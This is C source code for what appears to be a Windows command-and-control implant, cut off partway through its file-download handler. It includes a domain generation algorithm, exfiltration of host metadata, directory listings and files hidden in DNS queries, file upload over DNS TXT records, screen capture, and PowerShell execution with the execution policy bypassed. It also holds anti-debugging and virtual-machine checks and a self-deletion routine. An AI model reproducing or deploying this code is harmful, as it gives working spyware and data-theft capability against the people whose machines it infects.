#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <string.h>
#include <winsock2.h>
#include <Windows.h>
#include <stdint.h>
#include <winternl.h>
#include <VersionHelpers.h>
#include <intrin.h>
#include <Ws2tcpip.h>
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdlib.h>
#include <windns.h>
#include <wchar.h>
#include <locale.h>
#include <windows.h>
#include <wincrypt.h>
#include <Lmcons.h>
#include <iphlpapi.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Ws2_32.lib")  // Required for getnameinfo
#pragma comment(lib, "Iphlpapi.lib") // Required for GetAdaptersAddresses

#pragma comment(lib, "dnsapi.lib")
#define _CRT_SECURE_NO_WARNINGS


#define NEW_STREAM L":newads"

#define MAX_DNS_LABEL 63
#define PORT 8080
#define BUFFER_SIZE 1024
#define SIZE 1000

PWSTR dns_query(const char* domain_name, const char* message, char* result) {
    const char* hostname = domain_name;
    PDNS_RECORD pRecord;
    DNS_STATUS status;

    // Check if the domain exists (A record query)
    status = DnsQuery_UTF8(hostname, DNS_TYPE_A, DNS_QUERY_STANDARD, NULL, &pRecord, NULL);
    if (status == ERROR_SUCCESS) {
        //printf("Domain %s exists.\n", hostname);

        // Free memory allocated for DNS records
        DnsRecordListFree(pRecord, DnsFreeRecordList);
        result[0] = '\0';
        // Concatenate str1 and str2 into result
        //printf("\n%s\n", message);
        strcat_s(result, 500, message);
        strcat_s(result, 500, ".");
        strcat_s(result, 500, hostname);

        printf("\n%s\n", result);
        // Now query for TXT records
        //PDNS_RECORD pRecord = NULL;

        // Perform an A record query
        //DNS_STATUS status = DnsQuery_UTF8(result, DNS_TYPE_A, DNS_QUERY_STANDARD, NULL, &pRecord, NULL);
        status = DnsQuery_UTF8(result, DNS_TYPE_TEXT, DNS_QUERY_STANDARD, NULL, &pRecord, NULL);

        if (status == ERROR_SUCCESS) {
            //printf("\nA record query sent for domain: %s\n", hostname);

            // Free the memory immediately without processing the results
            DnsRecordListFree(pRecord, DnsFreeRecordList);
        }
        else {
            printf("A record query failed for domain: %s with error: %d\n", hostname, status);
        }
    }
    else {
        fprintf(stderr, "Domain %s does not exist or could not be resolved.\n", hostname);
    }

    return NULL;
}
//start of DGA

const char* vowels = "aeiou";
const char* consonants = "bcdfghklmnprstvxz";

const char* prefix_words[] = {
    "un", "under", "re", "in", "im", "il", "ir", "en", "em", "over",
    "mis", "dis", "pre", "post", "anti", "inter", "sub", "ultra",
    "non", "de", "pro", "trans", "ex", "macro", "micro", "mini",
    "mono", "multi", "semi", "co", "bi", "tri", "auto", "bio",
    "circum", "contra", "counter", "extra", "infra", "inter",
    "intro", "meta", "omni", "para", "peri", "proto", "retro",
    "subter", "super", "supra", "tele", "trans", "ultra", "vice"
};

const char* vowel_words[] = {
    "able", "ant", "ate", "age", "ance", "ancy", "an", "ary", "al",
    "en", "ency", "er", "etn", "ed", "ese", "ern", "ize", "ify",
    "ing", "ish", "ity", "ion", "ian", "ism", "ist", "ic", "ical",
    "ible", "ive", "ite", "ish", "ian", "or", "ous", "ure", "ace",
    "ade", "age", "ale", "ane", "ate", "ect", "end", "ent", "est",
    "ice", "ide", "ine", "ise", "ite", "ive", "ize", "ole", "one",
    "ose", "ous", "ule", "use", "ute"
};

const char* consonant_words[] = {
    "dom", "hood", "less", "like", "ly", "fy", "ful", "ness", "ment",
    "sion", "ssion", "ship", "ty", "th", "tion", "ward", "ment",
    "ness", "phobia", "phile", "scope", "meter", "graph", "gram",
    "phone", "logy", "tude", "er", "or", "ist", "ian", "eer", "age",
    "al", "ance", "ence", "cy", "ity", "ty", "ment", "ness", "ship"
};

const char* tlds[] = { ".net", ".info", ".com", ".biz", ".org", ".name" };

// Linear congruential generator for pseudorandom numbers
unsigned int seed;

void srand_custom(unsigned int s) {
    seed = s;
}

int rand_custom(int mod) {
    seed = (1103515245 * seed + 12345) & 0xFFFFFFFF;
    return seed % mod;
}

const char* random_el_from_list(const char* list[], int size) {
    return list[rand_custom(size)];
}

int ends_in_consonant(const char* domain) {
    int len = strlen(domain);
    return strchr(vowels, domain[len - 1]) == NULL;
}

// Custom safe concatenation function using strncat_s
void safe_strcat_s(char* dest, size_t dest_size, const char* src) {
    errno_t err = strncat_s(dest, dest_size, src, _TRUNCATE);
    if (err != 0) {
        fprintf(stderr, "strncat_s error: %d\n", err);
        exit(EXIT_FAILURE);
    }
}

void dga(char* domain, size_t domain_size) {
    int nr_parts = rand_custom(3) + 1;
    domain[0] = '\0';  // Initialize the domain string

    for (int i = 0; i < nr_parts; ++i) {
        safe_strcat_s(domain, domain_size, random_el_from_list(prefix_words, sizeof(prefix_words) / sizeof(prefix_words[0])));
        int pick_vowel = ends_in_consonant(domain);

        for (int j = 0; j < rand_custom(3) + 4; ++j) {
            const char* l = pick_vowel ? vowels : consonants;
            char c = l[rand_custom(strlen(l))];
            char temp[2] = { c, '\0' };
            safe_strcat_s(domain, domain_size, temp);
            pick_vowel = !pick_vowel;
        }

        const char* l = ends_in_consonant(domain) ? random_el_from_list(vowel_words, sizeof(vowel_words) / sizeof(vowel_words[0])) :
            random_el_from_list(consonant_words, sizeof(consonant_words) / sizeof(consonant_words[0]));
        safe_strcat_s(domain, domain_size, l);
        if (i < nr_parts - 1) {
            safe_strcat_s(domain, domain_size, "-");
        }
    }

    safe_strcat_s(domain, domain_size, random_el_from_list(tlds, sizeof(tlds) / sizeof(tlds[0])));
}

//end of DGA



char* base64Encoder(const char input_str[], int len_str)
{
    // Character set of base64 encoding scheme
    char char_set[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    // Resultant string
    char* res_str = (char*)malloc(SIZE * sizeof(char));

    int index, no_of_bits = 0, padding = 0, val = 0, count = 0, temp;
    int i, j, k = 0;

    // Loop takes 3 characters at a time from 
    // input_str and stores it in val
    for (i = 0; i < len_str; i += 3)
    {
        val = 0, count = 0, no_of_bits = 0;

        for (j = i; j < len_str && j <= i + 2; j++)
        {
            // binary data of input_str is stored in val
            val = val << 8;

            // (A + 0 = A) stores character in val
            val = val | input_str[j];

            // calculates how many time loop 
            // ran if "MEN" -> 3 otherwise "ON" -> 2
            count++;

        }

        no_of_bits = count * 8;

        // calculates how many "=" to append after res_str.
        padding = no_of_bits % 3;

        // extracts all bits from val (6 at a time) 
        // and find the value of each block
        while (no_of_bits != 0)
        {
            // retrieve the value of each block
            if (no_of_bits >= 6)
            {
                temp = no_of_bits - 6;

                // binary of 63 is (111111) f
                index = (val >> temp) & 63;
                no_of_bits -= 6;
            }
            else
            {
                temp = 6 - no_of_bits;

                // append zeros to right if bits are less than 6
                index = (val << temp) & 63;
                no_of_bits = 0;
            }
            res_str[k++] = char_set[index];
        }
    }

    // padding is done here
    for (i = 1; i <= padding; i++)
    {
        res_str[k++] = '-#-';
    }

    res_str[k] = '\0';
    return res_str;


}


void string2hexString(const char* input, char* output, size_t output_size) {
    int loop = 0;
    int i = 0;

    while (input[loop] != '\0') {
        // Ensure there is enough space in the output buffer
        if (i + 2 >= output_size) {
            fprintf(stderr, "Buffer size exceeded in string2hexString\n");
            return;
        }

        sprintf_s(output + i, output_size - i, "%02X", input[loop]);
        loop += 1;
        i += 2;
    }

    // Insert NULL terminator at the end of the output string
    if (i < output_size) {
        output[i++] = '\0';
    }
    else {
        fprintf(stderr, "Buffer size exceeded while adding NULL terminator\n");
    }
}





char final_domain[256];

void findDomain() {
    int nr_domains = 10;
    char domain[256];
    char result[500];
    unsigned int seed = 0x96EDC15;
    srand_custom(seed);
    for (int i = 0; i < nr_domains; ++i) {
        dga(domain, sizeof(domain));
        printf(domain);
        const char* hostname = domain;
        PDNS_RECORD pRecord;
        DNS_STATUS status;
        // Check if the domain exists (A record query)
        status = DnsQuery_UTF8(hostname, DNS_TYPE_A, DNS_QUERY_STANDARD, NULL, &pRecord, NULL);
        if (status == ERROR_SUCCESS) {

            if (strcpy_s(final_domain, sizeof(final_domain), hostname) != 0) {
                fprintf(stderr, "Error copying domain to final_domain\n");
                exit(EXIT_FAILURE);
            }
            //printf("Domain %s exists.\n", hostname);
            break;
        }
        else {
            fprintf(stderr, "\nDnsQuery failed for TXT records with error %d\n", status);
        }
    }
    //printf("\n%s hi\n", final_domain);
    
}


void sendMessage(const char* message) {
    char* enc = base64Encoder(message, strlen(message));
    //char enc[100];
    //string2hexString(message, enc, sizeof(enc));
    char result[500];
    dns_query(final_domain, enc, result);
}

void SendDataViaDNS(const char* base64Data) {
    char fullData[1024];  // Ensure this buffer is large enough
    const char* extraString = "EORC";
    snprintf(fullData, sizeof(fullData), "%s%s", base64Data, extraString);
    printf(fullData);
    size_t dataLen = strlen(fullData);
    size_t offset = 0;
    int chunkNumber = 0;
    char chunk[MAX_DNS_LABEL + 1];

    while (offset < dataLen) {
        size_t chunkSize = (dataLen - offset > MAX_DNS_LABEL) ? MAX_DNS_LABEL : (dataLen - offset);
        strncpy_s(chunk, sizeof(chunk), fullData + offset, chunkSize);
        chunk[chunkSize] = '\0';  // Null-terminate

        // Construct the DNS subdomain
        char dnsQuery[256];
        snprintf(dnsQuery, sizeof(dnsQuery), "ResponseChunk%d.%s.%s", chunkNumber++, chunk, final_domain);

        PDNS_RECORD pRecord2;
        DNS_STATUS status2;
        printf("%s\n", dnsQuery);
        // Check if the domain exists (A record query)
        status2 = DnsQuery_UTF8(dnsQuery, DNS_TYPE_A, DNS_QUERY_STANDARD, NULL, &pRecord2, NULL);
        // Send the DNS query

        offset += chunkSize;
    }
}


PPEB getPEB() {
#ifdef _WIN64
    return (PPEB)__readgsqword(0x60);
#elif _WIN32
    return (PPEB)__readfsdword(0x30);
#endif
}



int DebuggerPresent() {
    int res = 0;
    //general check
    if (IsDebuggerPresent()) {
        res = 1;
    }
    else {
        res = 0;
    }
    //checking by error for windows version lesser than 6
    if (!IsWindowsVistaOrGreater()) {
        DWORD err = 100;
        SetLastError(err);
        OutputDebugString(L"TestWindow");
        if (GetLastError() == err) {
            res = 0;    //not being debugged
        }
        else {
            res = 1;
        }
    }
    //checking with the beingdebugged flag of PEB (Process Environment Block)
    PPEB peb = getPEB();
    res = peb->BeingDebugged == 1 ? 1 : 0;
    return res;
}


static inline unsigned long long rdtsc_diff() {
    unsigned long long ret1, ret2;
    ret1 = __rdtsc();
    ret2 = __rdtsc();
    return ret2 - ret1;
}

int cpu_rdtsc() {
    unsigned long long avg = 0;
    for (int i = 0; i < 10; i++) {
        avg = avg + rdtsc_diff();
        Sleep(500);
    }
    avg = avg / 10;
    if (avg > 0 && avg < 750) {
        return 0;
    }
    else {
        return 1;
    }
}

int cpuid_hv_bit() {
    int registers[4]; //stores data return from EAX, EBX, ECX, EDX
    __cpuid(registers, 0); //0 value for EAX
    int res = (registers[2] >> 31) & 1;
    return res;
}



static inline char* cpuid_hv_vendor_00() {
    int cpuInfo[4];
    __cpuid(cpuInfo, 0x40000000);
    static char vendor[13];
    sprintf_s(vendor, sizeof(vendor), "%c%c%c%c", (cpuInfo[1] >> 0) & 0xFF,
        (cpuInfo[1] >> 8) & 0xFF,
        (cpuInfo[1] >> 16) & 0xFF,
        (cpuInfo[1] >> 24) & 0xFF);

    sprintf_s(vendor + 4, sizeof(vendor)-4, "%c%c%c%c", (cpuInfo[2] >> 0) & 0xFF,
        (cpuInfo[2] >> 8) & 0xFF,
        (cpuInfo[2] >> 16) & 0xFF,
        (cpuInfo[2] >> 24) & 0xFF);

    sprintf_s(vendor + 8, sizeof(vendor)-8, "%c%c%c%c", (cpuInfo[3] >> 0) & 0xFF,
        (cpuInfo[3] >> 8) & 0xFF,
        (cpuInfo[3] >> 16) & 0xFF,
        (cpuInfo[3] >> 24) & 0xFF);

    vendor[12] = '\0';
    return vendor;
}


    


int SelfDelete(void) {

    //rename the default data stream to a new name and deleting the newly renamed data stream which will make our program disappear

    HANDLE hFile = INVALID_HANDLE_VALUE; // ONE OF THE ONLY HANDLES THAT USE INVALID_HANDLE_VALUE
    const wchar_t* NEWSTREAM = (const wchar_t*)NEW_STREAM;
    size_t RenameSize = sizeof(FILE_RENAME_INFO) + sizeof(NEWSTREAM);
    PFILE_RENAME_INFO PFRI = NULL;
    WCHAR PathSize[MAX_PATH * 2] = { 0 }; // [MAX_PATH * 2] BECAUSE OF WIDE CHARS
    FILE_DISPOSITION_INFO SetDelete = { 0 };

    //ALLOC BUFFER FOR FILE_RENAME_INFO]
    PFRI = reinterpret_cast<PFILE_RENAME_INFO>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, RenameSize));
    if (!PFRI) {
        return EXIT_FAILURE;
    }


    ZeroMemory(PathSize, sizeof(PathSize));
    ZeroMemory(&SetDelete, sizeof(FILE_DISPOSITION_INFO));


    //MARK FILE FOR DELETION

    SetDelete.DeleteFile = TRUE;


    //SET NEW DATA STREAM BUFFER & SIZE IN FILE_RENAME_INFO
    PFRI->FileNameLength = sizeof(NEWSTREAM);
    RtlCopyMemory(PFRI->FileName, NEWSTREAM, sizeof(NEWSTREAM));

    //GET CURRENT FILENAME
    if (GetModuleFileNameW(NULL, PathSize, MAX_PATH * 2) == 0) {
        return EXIT_FAILURE;
    }

    //GET FILE HANDLE
    hFile = CreateFileW(PathSize, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return EXIT_FAILURE;
    }
    
    //RENAME
    if (!SetFileInformationByHandle(hFile, FileRenameInfo, PFRI, RenameSize)) {
        //warn("[SetFileInformationByHandle] failed to rewrite the data stream, error: 0x%lx", CustomError());
    }

    CloseHandle(hFile);

    //DELETION II
    hFile = CreateFileW(PathSize, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        //warn("[CreateFileW] failed to get a handle to the file, error: 0x%lx", CustomError());
        return EXIT_FAILURE;
    }


    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &SetDelete, sizeof(SetDelete))) {
        //warn("[SetFileInformationByHandle] failed to mark file for deletion, error: 0x%lx", CustomError());
        return EXIT_FAILURE;
    }

    CloseHandle(hFile);

    HeapFree(GetProcessHeap(), 0, PFRI);

    return EXIT_SUCCESS;


}



char* Base64Encode(const BYTE* data, DWORD dataSize) {
    DWORD encodedSize = 0;
    CryptBinaryToStringA(data, dataSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encodedSize);
    char* encoded = (char*)LocalAlloc(LPTR, encodedSize);
    CryptBinaryToStringA(data, dataSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encoded, &encodedSize);
    return encoded;
}

VOID DemonMetaData(PCHAR* MetaData, BOOL Header) {
    PIP_ADAPTER_ADDRESSES AdapterInfo = NULL;
    OSVERSIONINFOEXW OsVersions = { 0 };
    SIZE_T Length = 0;
    DWORD dwLength = 0;
    DWORD AgentID = 1234;
    DWORD PPID = 4321;
    DWORD ProcessArch = 64;
    BOOL Elevated = FALSE;
    PVOID BaseAddress = (PVOID)0x100000;
    DWORD OS_Arch = 64;
    DWORD SleepDelay = 5000;
    DWORD SleepJitter = 10;
    INT64 KillDate = 0;
    DWORD WorkingHours = 8;
    CHAR ComputerName[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
    CHAR UserName[UNLEN + 1] = { 0 };
    CHAR DomainName[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
    CHAR IPAddress[46] = { 0 };
    WCHAR ProcessPath[MAX_PATH] = { 0 };
    DWORD ProcessID = GetCurrentProcessId();
    DWORD ParentProcessID = 0;

    // Get Computer Name
    dwLength = MAX_COMPUTERNAME_LENGTH + 1;
    if (!GetComputerNameA(ComputerName, &dwLength)) {
        strcpy_s(ComputerName, "Unknown");
    }

    // Get Username
    dwLength = UNLEN + 1;
    if (!GetUserNameA(UserName, &dwLength)) {
        strcpy_s(UserName, "Unknown");
    }

    // Get Domain Name
    dwLength = MAX_COMPUTERNAME_LENGTH + 1;
    if (!GetComputerNameExA(ComputerNameDnsDomain, DomainName, &dwLength)) {
        strcpy_s(DomainName, "Unknown");
    }

    // Get Internal IP Address using GetAdaptersAddresses
    ULONG outBufLen = 0;
    GetAdaptersAddresses(AF_UNSPEC, 0, NULL, NULL, &outBufLen);
    if (outBufLen > 0) {
        AdapterInfo = (PIP_ADAPTER_ADDRESSES)malloc(outBufLen);
        if (AdapterInfo && GetAdaptersAddresses(AF_UNSPEC, 0, NULL, AdapterInfo, &outBufLen) == NO_ERROR) {
            if (AdapterInfo->FirstUnicastAddress) {
                getnameinfo(AdapterInfo->FirstUnicastAddress->Address.lpSockaddr,
                    AdapterInfo->FirstUnicastAddress->Address.iSockaddrLength,
                    IPAddress, sizeof(IPAddress), NULL, 0, NI_NUMERICHOST);
            }
        }
    }
    if (AdapterInfo) free(AdapterInfo);

    // Get Process Path
    if (!GetModuleFileNameW(NULL, ProcessPath, MAX_PATH)) {
        wcscpy_s(ProcessPath, L"Unknown");
    }

    // Get OS Version
    ZeroMemory(&OsVersions, sizeof(OsVersions));
    OsVersions.dwOSVersionInfoSize = sizeof(OsVersions);
    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (hNtdll) {
        RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
        if (pRtlGetVersion) {
            pRtlGetVersion((PRTL_OSVERSIONINFOW)&OsVersions);
        }
        FreeLibrary(hNtdll);
    }
    DWORD OS_Major = OsVersions.dwMajorVersion;
    DWORD OS_Minor = OsVersions.dwMinorVersion;
    DWORD OS_ProductType = OsVersions.wProductType;
    DWORD OS_ServicePack = OsVersions.wServicePackMajor;
    DWORD OS_BuildNumber = OsVersions.dwBuildNumber;

    SIZE_T bufferSize = 1024;
    *MetaData = (PCHAR)malloc(bufferSize);
    if (*MetaData) {
        snprintf(*MetaData, bufferSize,
            "AgentID: %u\nPPID: %u\nProcessArch: %u\nElevated: %d\nBaseAddress: %p\nOS_Arch: %u\n"
            "ComputerName: %s\n"
            "UserName: %s\nDomainName: %s\nIPAddress: %s\nProcessPath: %ls\nProcessID: %u\nParentProcessID: %u\n"
            "OS_Major: %u\nOS_Minor: %u\nOS_ProductType: %u\nOS_ServicePack: %u\nOS_BuildNumber: %u\n",
            AgentID, PPID, ProcessArch, Elevated, BaseAddress, OS_Arch,
            ComputerName,
            UserName, DomainName, IPAddress, ProcessPath, ProcessID, ParentProcessID,
            OS_Major, OS_Minor, OS_ProductType, OS_ServicePack, OS_BuildNumber);
    }

    printf("%s\n", MetaData);


}



BOOL WinScreenshot(OUT PVOID* ImagePointer, OUT PSIZE_T ImageSize) {
    HDC hDC = GetDC(NULL);
    if (!hDC) return FALSE;

    HDC hMemDC = CreateCompatibleDC(hDC);
    if (!hMemDC) {
        ReleaseDC(NULL, hDC);
        return FALSE;
    }

    INT width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    INT height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hDC, width, height);
    if (!hBitmap) {
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hDC);
        return FALSE;
    }

    SelectObject(hMemDC, hBitmap);
    if (!BitBlt(hMemDC, 0, 0, width, height, hDC, x, y, SRCCOPY)) {
        DeleteObject(hBitmap);
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hDC);
        return FALSE;
    }

    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    DWORD cbBits = bmp.bmWidthBytes * bmp.bmHeight;
    PVOID BitMapImage = LocalAlloc(LPTR, cbBits);
    if (!BitMapImage) {
        DeleteObject(hBitmap);
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hDC);
        return FALSE;
    }

    GetBitmapBits(hBitmap, cbBits, BitMapImage);

    *ImagePointer = BitMapImage;
    *ImageSize = cbBits;

    DeleteObject(hBitmap);
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);

    return TRUE;
}


BOOL SaveBitmapToFile(LPCSTR filename, PVOID ImagePointer, SIZE_T ImageSize, INT width, INT height) {
    FILE* file;
    if (fopen_s(&file, filename, "wb") != 0) {
        printf("Failed to open file\n");
        return FALSE;
    }

    // Define BMP headers
    BITMAPFILEHEADER bmfHeader = { 0 };
    BITMAPINFOHEADER bi = { 0 };

    bmfHeader.bfType = 0x4D42;  // "BM"
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = bmfHeader.bfOffBits + (DWORD)ImageSize;

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height;  // Negative height for top-down BMP
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = (DWORD)ImageSize;

    // Write headers
    fwrite(&bmfHeader, sizeof(BITMAPFILEHEADER), 1, file);
    fwrite(&bi, sizeof(BITMAPINFOHEADER), 1, file);

    // Write bitmap data
    fwrite(ImagePointer, ImageSize, 1, file);

    fclose(file);
    return TRUE;
}


int ListDirectoryContents(WCHAR* output, size_t maxLen) {
    WCHAR currentDir[MAX_PATH];
    WCHAR searchPath[MAX_PATH];
    WIN32_FIND_DATA findData;
    HANDLE hFind;

    output[0] = L'\0'; // Start with empty string

    // Get current directory
    if (!GetCurrentDirectoryW(MAX_PATH, currentDir)) {
        swprintf(output, maxLen, L"Failed to get current directory: %d\n", GetLastError());
        return 1;
    }

    // Build the search path: <dir>\*
    wsprintfW(searchPath, L"%ls\\*", currentDir);

    // Start directory listing
    hFind = FindFirstFileW(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        swprintf(output, maxLen, L"Failed to list directory: %d\n", GetLastError());
        return 1;
    }

    // Append header
    swprintf(output + wcslen(output), maxLen - wcslen(output), L"Current Directory:\n%ls\n\n", currentDir);

    // Append each file/dir name
    do {
        if (wcscmp(findData.cFileName, L".") != 0 && wcscmp(findData.cFileName, L"..") != 0) {
            swprintf(output + wcslen(output), maxLen - wcslen(output), L"%ls\n", findData.cFileName);
        }
    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);
}

BOOL changeDirectory(LPWSTR path)
{
    if (!SetCurrentDirectoryW(path)) {
        printf("Failed to set current directory: %d\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

BOOL CreateDirectoryAtPath(LPWSTR path) {
    return CreateDirectoryW(path, NULL);
}

int base64_char_value(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

int base64_decode(const char* in, unsigned char* out, int outlen) {
    int len = 0;
    int val = 0, valb = -8;

    while (*in && *in != '=') {
        int c = base64_char_value(*in++);
        if (c == -1) continue;

        val = (val << 6) + c;
        valb += 6;

        if (valb >= 0) {
            if (len < outlen) {
                out[len++] = (char)((val >> valb) & 0xFF);
            }
            valb -= 8;
        }
    }
    return len;
}

char* ConvertWideToChar(PWSTR pwstr) {
    int len = WideCharToMultiByte(CP_UTF8, 0, pwstr, -1, NULL, 0, NULL, NULL);
    if (len == 0) return NULL;

    char* result = (char*)malloc(len);
    if (result == NULL) return NULL;

    WideCharToMultiByte(CP_UTF8, 0, pwstr, -1, result, len, NULL, NULL);
    return result;
}

char* run_powershell_with_args(const char* script_path, const char* args) {
    char command[1024];
    if (args)
        snprintf(command, sizeof(command), "powershell -ExecutionPolicy Bypass -File \"%s\" %s", script_path, args);
    else
        snprintf(command, sizeof(command), "powershell -ExecutionPolicy Bypass -File \"%s\"", script_path);

    FILE* pipe = _popen(command, "r");
    if (!pipe) return NULL;

    char* output = (char*)malloc(8192);  // Adjust size as needed
    if (!output) {
        _pclose(pipe);
        return NULL;
    }
    output[0] = '\0';

    char buffer[256];
    while (fgets(buffer, sizeof(buffer), pipe)) {
        if (strcat_s(output, 8192, buffer) != 0) {
            // Handle error if buffer exceeds size
            break;
        }
    }

    _pclose(pipe);
    return output;  // Caller must free
}



void ExecuteCommand(char* command) {
    if (strcmp(command, "screenshot") == 0) {
        PVOID    Image = NULL;
        SIZE_T   Size = 0;
        if (WinScreenshot(&Image, &Size)) {
            INT width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
            INT height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

            if (SaveBitmapToFile("screenshot.bmp", Image, Size, width, height)) {
                printf("Screenshot saved as screenshot.bmp\n");
            }
            else {
                printf("Failed to save screenshot\n");
            }

            LocalFree(Image);  // Free allocated memory
        }
        else {
            printf("Failed to capture screenshot\n");
        }
        //char* encoded = Base64Encode((BYTE*)Image, (DWORD)Size);
		//printf("Encoded: %s\n", encoded);
    }
    else if(strcmp(command, "checkin") == 0 ) {
        PCHAR MetaData = NULL;
		DemonMetaData(&MetaData, TRUE);
        if (MetaData == NULL) {
            printf("DemonMetaData failed.\n");
            return;
        }
        printf("Metadata: %s\n", MetaData);
        char* res = base64Encoder(MetaData, strlen(MetaData));
        printf("Encoded: %s\n", res);
        SendDataViaDNS(res);

        free(MetaData);
    }
    

    else if (strcmp(command, "dir") == 0) {
        WCHAR result[8192];
        ListDirectoryContents(result, 8192);
        wprintf(L"%ls", result);

        int len = WideCharToMultiByte(CP_UTF8, 0, result, -1, NULL, 0, NULL, NULL);
        char* output = (char*)malloc(len);
        WideCharToMultiByte(CP_UTF8, 0, result, -1, output, len, NULL, NULL);


        char* res = base64Encoder(output, strlen(output));
        printf("Encoded: %s\n", res);
        SendDataViaDNS(res);
        
    }

    else if (strcmp(command, "pwd") == 0) {
        WCHAR Path[MAX_PATH * 2] = { 0 };
        DWORD Return = GetCurrentDirectoryW(MAX_PATH * 2, Path);

        if (Return == 0) {
            printf("Failed to get current dir: %lu\n", GetLastError());
        }
        else {
            int len = WideCharToMultiByte(CP_UTF8, 0, Path, -1, NULL, 0, NULL, NULL);
            char* output = (char*)malloc(len);
            WideCharToMultiByte(CP_UTF8, 0, Path, -1, output, len, NULL, NULL);

            char* res = base64Encoder(output, strlen(output));
            printf("Encoded: %s\n", res);
            SendDataViaDNS(res);
        }
    }

    else if (strncmp(command, "cd", 2) == 0) {
        const char* path = command + 2;
        // Skip leading spaces if present
        while (*path == ' ') path++;
        WCHAR wPath[MAX_PATH];
        MultiByteToWideChar(CP_UTF8, 0, path, -1, wPath, MAX_PATH);
        BOOL x = changeDirectory(wPath);
    }

    else if (strncmp(command, "mkdir", 5) == 0) {
        const char* path = command + 5;
        // Skip leading spaces if present
        while (*path == ' ') path++;
        WCHAR wPath[MAX_PATH];
        MultiByteToWideChar(CP_UTF8, 0, path, -1, wPath, MAX_PATH);
        BOOL x = CreateDirectoryAtPath(wPath);
    }

    else if (strncmp(command, "upload", 6) == 0) {
        const char* full_path = command + 7; // Skip "upload "
        const char* filename = strrchr(full_path, '\\');
        if (filename)
            filename++; // Move past the last '\'
        else
            filename = full_path;
        FILE* fp = NULL;
        errno_t err = fopen_s(&fp, filename, "wb");
        if (err != 0 || !fp) {
            printf("Failed to open file %s for writing.\n", filename);
            return;
        }
        printf("uploading...");

        char collected[100000] = { 0 };  // Adjust size if expecting larger files
        int offset = 0;

        while (TRUE) {
            char dnsQuery[256];
            snprintf(dnsQuery, sizeof(dnsQuery), "sendFile.%s", final_domain);

            PDNS_RECORD pRecord3 = NULL;
            DNS_STATUS status3 = DnsQuery_UTF8(dnsQuery, DNS_TYPE_TEXT, DNS_QUERY_STANDARD, NULL, &pRecord3, NULL);
            printf("%ld",status3);
            if (status3==ERROR_SUCCESS) {
                if (pRecord3->wType == DNS_TYPE_TEXT) {
                    PWSTR data = pRecord3->Data.TXT.pStringArray[0];
                    printf("%s", data);
                    char* txtData = (char*)data;
                    //printf(txtData);
                    if (strcmp(txtData, "NoMoreChunks") == 0) {
                        printf("exiting");
                        
                        break;
                    }

                    strcat_s(collected, sizeof(collected), txtData);
                    offset += strlen(txtData);
                    
                }
                DnsRecordListFree(pRecord3, DnsFreeRecordList);
            }
            Sleep(500);  // Prevent flooding
        }

        int b64_len = strlen(collected);
        unsigned char* decodedData = (unsigned char*)malloc(b64_len);  // Alloc based on input size
        int decodedSize = base64_decode(collected, decodedData, b64_len);
        printf("%s", decodedData);

        if (decodedSize > 0) {
            fwrite(decodedData, 1, decodedSize, fp);
            printf("File '%s' written successfully.\n", filename);
        }
        else {
            printf("Base64 decoding failed.\n");
        }

        free(decodedData);
        fclose(fp);
    }

    else if (strncmp(command, "download", 8) == 0) {
        const char* filepath = command + 9;
        FILE* fp = NULL;
        errno_t err = fopen_s(&fp, filepath, "rb");
        if (err != 0 || !fp) {
            printf("Failed to open file %s for reading.\n", filepath);
            return;
        }

        printf("Downloading %s...\n", filepath);

        fseek(fp, 0, SEEK_END);
        long filesize = ftell(fp);
        fseek(fp, 0, SEEK_SET);

        char* buffer = (char*)malloc(filesize);
        fread(buffer, 1, filesize, fp);
        fclose(fp);

        // Base64 encode
        char* b64_data = (char*)malloc(filesize * 2); // Extra space for encoded
        b64_data = base64Encoder(buffer, filesize);
        int b64_len = strlen(b64_data);
        free(buffer);

        // Split into 200-byte chunks and send one at a time
        int chunk_size = 60;
        for (int i = 0; i < b64_len; i += chunk_size) {
            char chunk[256] = { 0 };
